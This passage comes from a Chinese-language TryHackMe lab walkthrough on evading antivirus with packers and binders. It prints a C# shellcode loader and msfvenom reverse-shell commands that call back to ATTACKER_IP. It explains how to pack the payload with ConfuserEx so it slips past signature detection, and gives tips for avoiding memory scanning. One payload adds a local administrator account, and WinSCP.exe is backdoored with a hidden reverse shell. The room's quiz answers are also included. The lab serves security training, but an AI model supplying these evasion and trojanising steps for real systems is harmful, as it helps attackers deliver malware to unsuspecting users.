</ul>
<p>打包工具通常由软件开发人员使用，目的是保护其软件不被逆向工程或破解。它们通过实施一系列变换，包括压缩、加密、增加调试保护等，达到一定的保护效果。正如你可能已经猜到的，打包工具也常用于轻松混淆恶意软件。</p>
<p>市面上有很多打包工具，包括 UPX、MPRESS、Themida 等。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="打包一个应用程序">打包一个应用程序<a href="#打包一个应用程序" class="hash-link" aria-label="Direct link to 打包一个应用程序" title="Direct link to 打包一个应用程序">​</a></h3>
<p>虽然每个打包工具的操作方式不同，但让我们来看一个简单的打包工具会做什么的基本示例。</p>
<p>当一个应用程序被打包时，它会通过一个<strong>打包</strong>函数以某种方式进行转换。打包函数需要能够以一种可以被<strong>解包</strong>函数合理逆转的方式混淆和转换应用程序的原始代码，从而保留应用程序的原始功能。虽然有时打包工具可能会添加一些代码（例如，使调试变得更困难），但它通常希望在执行时能够恢复你编写的原始代码。</p>
<p><img decoding="async" loading="lazy" alt="packers" src="/assets/images/9aacb2fab2a656ffc82a7b0344918062-4124fb3fea650fae8d113ae1489d9a65.png" width="1190" height="459" class="img_ev3q"></p>
<p>打包后的应用程序将包含你打包后的应用程序代码。由于这个新的打包代码被混淆，应用程序需要能够从中解包出原始代码。为此，打包工具会嵌入一个包含解包器的代码段，并将可执行文件的主入口点重定向到该代码段。</p>
<p>当你的打包应用程序被执行时，以下情况将发生：</p>
<p><img decoding="async" loading="lazy" alt="packed app" src="/assets/images/408fb909374c2b54bebef9809eaa417a-bc7ddbc8b12f766bf5b086dbbe4d592f.png" width="839" height="588" class="img_ev3q"></p>
<ol>
<li>
<p>解包器首先执行，因为它是可执行文件的入口点。</p>
<p>解包器读取打包的应用程序代码。</p>
<p>解包器将原始解包代码写入内存中的某个位置，并将应用程序的执行流程指向该位置。</p>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="打包工具与-av">打包工具与 AV<a href="#打包工具与-av" class="hash-link" aria-label="Direct link to 打包工具与 AV" title="Direct link to 打包工具与 AV">​</a></h3>
<p>到现在为止，我们可以看到打包工具如何帮助绕过 AV 解决方案。假设你构建了一个反向 shell 可执行文件，但 AV 将其识别为恶意软件，因为它与已知的签名匹配。在这种情况下，使用打包工具可以将反向 shell 可执行文件转换，使其在磁盘上不再匹配任何已知的签名。因此，你应该能够将你的载荷分发到任何机器的磁盘上，而不会遇到太大问题。</p>
<p>然而，AV 解决方案仍然有可能捕获你的打包应用程序，原因有以下几点：</p>
<ul>
<li>尽管你的原始代码可能已经被转换成无法识别的形式，但请记住，打包的可执行文件包含一个带有解包器代码的代码段。如果解包器有已知的签名，AV 解决方案可能仅凭解包器代码段就会标记任何打包的可执行文件。</li>
<li>在某个时刻，你的应用程序会将原始代码解包到内存中以便执行。如果你试图绕过的 AV 解决方案能够进行内存扫描，那么在你的代码被解包后，你仍然可能会被检测到。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="打包我们的-shellcode">打包我们的 shellcode<a href="#打包我们的-shellcode" class="hash-link" aria-label="Direct link to 打包我们的 shellcode" title="Direct link to 打包我们的 shellcode">​</a></h3>
<p>让我们从一个基本的 C# shellcode 开始。你也可以在你的 Windows 机器上找到这段代码：<code>C:\Tools\CS Files\UnEncStagelessPayload.cs</code></p>
<div class="language-c# codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c# codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Net;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Text;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Configuration.Install;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Runtime.InteropServices;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">using System.Security.Cryptography.X509Certificates;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Program {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [DllImport(&quot;kernel32&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 MEM_COMMIT = 0x1000;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  public static void Main()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr threadHandle = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UInt32 threadId = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IntPtr parameter = IntPtr.Zero;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    WaitForSingleObject(threadHandle, 0xFFFFFFFF);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个载荷获取由 msfvenom 生成的 shellcode，并将其在一个单独的线程中运行。为了使其正常工作，你需要生成一个新的 shellcode，并将其放入代码中的变量 <code>shellcode</code>。`</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后，你可以使用以下命令在 Windows 机器上编译你的载荷：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; csc UnEncStagelessPayload.cs</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦你有了一个可工作的可执行文件，可以尝试将其上传到 THM Antivirus Check! 页面（桌面上的链接）。AV 应该会立即标记它。接下来，让我们在相同的载荷上使用打包工具，看看会发生什么。</p>
<p>我们将使用 <a href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0" target="_blank" rel="noopener noreferrer">ConfuserEx</a> 打包工具来执行此任务，因为我们的载荷是用 .NET 编程的。为了方便你，你可以在桌面上找到一个快捷方式。</p>
<p>ConfuserEx 需要你指定它将要工作的文件夹。确保选择桌面作为基础目录，如下图所示。设置好基础目录后，将你要打包的可执行文件拖放到界面上，最终你应该得到如下结果：</p>
<p><img decoding="async" loading="lazy" alt="Packer config part1" src="/assets/images/9214df2a88ffffbf8561502aa19a375c-6d6448a2b93db50694bb4bff87fd392d.png" width="780" height="586" class="img_ev3q"></p>
<p>接下来，进入设置标签页并选择我们的载荷。一旦选择好，点击 &quot;+&quot; 按钮将设置添加到你的载荷中。这应该会创建一个名为 &quot;true&quot; 的规则。确保同时启用压缩选项：</p>
<p><img decoding="async" loading="lazy" alt="Packer config part2" src="/assets/images/857e5540e14f4ebf743fbd4d2f8ee503-226407c0e933c30175d86846724ad161.png" width="780" height="585" class="img_ev3q"></p>
<p>现在我们将编辑 &quot;true&quot; 规则，并将其设置为最大预设值：</p>
<p><img decoding="async" loading="lazy" alt="packer config part3" src="/assets/images/96946f1aff585a91e78408b96e446ea4-86f73114e6766b511babac7dd31d24f3.png" width="386" height="593" class="img_ev3q"></p>
<p>最后，我们将前往 &quot;Protect!&quot; 标签页并点击 &quot;Protect&quot;：</p>
<p><img decoding="async" loading="lazy" alt="packer config part 4" src="/assets/images/e0e3ca97245641d3954f26fa986aae87-b1d37974ff96dbaabc781684b63ec0f5.png" width="779" height="586" class="img_ev3q"></p>
<p>新的载荷应该已经准备好，并且上传到 THM Antivirus Checker 时希望不会触发任何警报！（桌面上有快捷方式）。事实上，如果你执行你的载荷并设置监听器，你应该能够获得一个回连 shell：<code>nc</code></p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@attackbox$ nc -lvp 7478</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>到目前为止，一切顺利，但请记住，我们之前谈到过 AV 进行内存扫描的问题。如果你尝试在反向 shell 上运行命令，AV 会注意到你的 shell 并将其终止。这是因为 Windows Defender 会挂钩某些 Windows API 调用，并在使用这些 API 调用时进行内存扫描。在 msfvenom 生成的任何 shell 中，都会调用 CreateProcess() 并被检测到。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="那我们现在该怎么办">那我们现在该怎么办？<a href="#那我们现在该怎么办" class="hash-link" aria-label="Direct link to 那我们现在该怎么办？" title="Direct link to 那我们现在该怎么办？">​</a></h3>
<p>虽然绕过内存扫描超出了本房间的范围，但有几个简单的做法可以帮助避免检测：</p>
<ul>
<li><strong>等待一段时间</strong>。尝试再次生成反向 shell，并在发送任何命令之前等待大约 5 分钟。你会发现 AV 不再报错。原因是扫描内存是一项昂贵的操作。因此，AV 在你的进程启动后会扫描一段时间，但最终会停止。</li>
<li><strong>使用较小的载荷</strong>。载荷越小，被检测到的可能性越低。如果你使用 msfvenom 生成一个单一命令而不是反向 shell，AV 会更难检测到它。你可以尝试使用以下命令并查看结果： <code>msfvenom -a x64 -p windows/x64/exec CMD=&#x27;net user pwnd Password321 /add;net localgroup administrators pwnd /add&#x27; -f csharp</code></li>
</ul>
<p>如果检测不是问题，你甚至可以使用一个简单的技巧。从你的反向 shell 中，再次运行 <code>cmd.exe</code>。AV 会检测到你的载荷并终止关联的进程，但不会终止你刚刚生成的新 <code>cmd.exe</code>。</p>
<p>虽然每个 AV 的表现都不同，但大多数情况下，它们会有类似的绕过方式，因此在测试过程中值得探索你注意到的任何异常行为。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>打包工具是否能帮助你混淆恶意代码以绕过 AV 解决方案？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>打包工具是否通常会在运行之前将原始代码解包到内存中？(yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>是否有些打包工具会被某些 AV 解决方案识别为恶意？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>按照说明创建一个打包后的载荷，并将其上传到 THM Antivirus Check（网址：<code>http://10.10.14.106/</code>）。</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="binders---捆绑工具">Binders - 捆绑工具<a href="#binders---捆绑工具" class="hash-link" aria-label="Direct link to Binders - 捆绑工具" title="Direct link to Binders - 捆绑工具">​</a></h2>
<p>虽然不是一种 AV 绕过方法，捆绑工具在设计要分发给最终用户的恶意载荷时也很重要。<strong>捆绑工具</strong>是一种将两个（或更多）可执行文件合并为一个的程序。当你想要将载荷隐藏在另一个已知程序中，以欺骗用户相信他们正在执行不同程序时，通常会使用捆绑工具。</p>
<p><img decoding="async" loading="lazy" alt="binder" src="/assets/images/5c72d80a077a1f8a813a70c01a6561e9-1741683420658-83-7fecba1c741620e3c6e72b295e341b15.png" width="1379" height="798" class="img_ev3q"></p>
<p>虽然每个捆绑工具的工作方式可能略有不同，但它们基本上会将你的 shellcode 代码添加到合法程序中，并以某种方式执行它。</p>
<p>例如，你可以修改 PE 头中的入口点，使得你的 shellcode 在程序之前执行，然后在执行完后将执行流重定向回合法程序。通过这种方式，当用户点击生成的可执行文件时，你的 shellcode 会先悄无声息地执行，并在用户不注意的情况下继续正常运行程序。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用-msfvenom-进行捆绑">使用 msfvenom 进行捆绑<a href="#使用-msfvenom-进行捆绑" class="hash-link" aria-label="Direct link to 使用 msfvenom 进行捆绑" title="Direct link to 使用 msfvenom 进行捆绑">​</a></h3>
<p>你可以轻松地将任何你喜欢的载荷植入到任何 .exe 文件中。二进制文件仍然会像往常一样工作，但会悄悄地执行额外的载荷。msfvenom 使用的方法是通过为恶意程序创建一个额外的线程来注入载荷，这与之前提到的方法略有不同，但达到了相同的效果。拥有一个独立的线程甚至更好，因为如果你的 shellcode 因某些原因失败，你的程序仍然不会被阻止。</p>
<p>对于这个任务，我们将对位于 <code>C:\Tools\WinSCP</code> 的 WinSCP 可执行文件进行后门植入。</p>
<p>要创建一个带有后门的 WinSCP.exe，我们可以在 Windows 机器上使用以下命令：</p>
<p><strong>注意：</strong> Metasploit 已经安装在 Windows 机器上，方便使用，但生成载荷可能需要三分钟时间（产生的警告可以安全忽略）。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>生成的 WinSCP-evil.exe 将在用户未察觉的情况下执行一个 reverse_tcp meterpreter 载荷。在执行之前，请记得设置监听器以接收反向 shell。当你执行植入后门的可执行文件时，它应该会启动一个反向 shell，并在继续执行 WinSCP.exe 的同时将 shell 返回给你：<code>nc</code></p>
<p><img decoding="async" loading="lazy" alt="winscp execution" src="/assets/images/06c3bd06d935a937b2af7dace6a41a27-1741683420658-85-377be7084d9f60bfce9401ee263af8cc.png" width="1071" height="692" class="img_ev3q"></p>
<p>👇</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@attackbox$ nc -lvp 7779      </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on 0.0.0.0 7779</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection received on 10.10.183.127 49813</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows [Version 10.0.17763.1821]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(c) 2018 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绑定器与-av">绑定器与 AV<a href="#绑定器与-av" class="hash-link" aria-label="Direct link to 绑定器与 AV" title="Direct link to 绑定器与 AV">​</a></h3>
<p>绑定器对于隐藏载荷并不会对 AV 解决方案起到太多作用。仅仅将两个可执行文件合并，而没有任何更改，意味着生成的可执行文件仍然会触发原始载荷所匹配的任何签名。</p>
<p>绑定器的主要用途是让用户相信他们正在执行一个合法的可执行文件，而不是恶意载荷。</p>
<p>在创建真正的载荷时，您可能需要使用编码器、加密器或打包工具来隐藏您的 shellcode，以绕过基于签名的 AV，然后将其绑定到一个已知的可执行文件中，这样用户就无法知道正在执行的内容。</p>
<p>如果您尝试将没有经过打包的绑定可执行文件上传到 THM Antivirus Check 网站（桌面上有链接），您应该会收到来自服务器的检测结果，因此，单独使用这种方法并不能帮助您从服务器获取旗帜。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>绑定器能帮助绕过杀毒软件吗？ (yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>绑定器能将有效载荷伪装成合法的可执行文件吗？(yea/nay)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---结论">Conclusion - 结论<a href="#conclusion---结论" class="hash-link" aria-label="Direct link to Conclusion - 结论" title="Direct link to Conclusion - 结论">​</a></h2>
<p>在本房间中，我们探索了一些可供攻击者使用的策略，以绕过仅依赖于基于磁盘的检测的杀毒引擎。虽然这只是任何现代杀毒引擎提供的机制之一，但至少我们应该能够将有效载荷传送到受害者的磁盘上，作为第一步。绕过内存检测和其他高级检测机制的内容将在未来的房间中讨论。如果你想了解更多关于绕过进一步的 Windows 安全机制的信息，可以查看 <a href="https://tryhackme.com/room/runtimedetectionevasion" target="_blank" rel="noopener noreferrer">Runtime Detection Evasion</a>，以了解如何防止你的有效载荷被触发。</p>
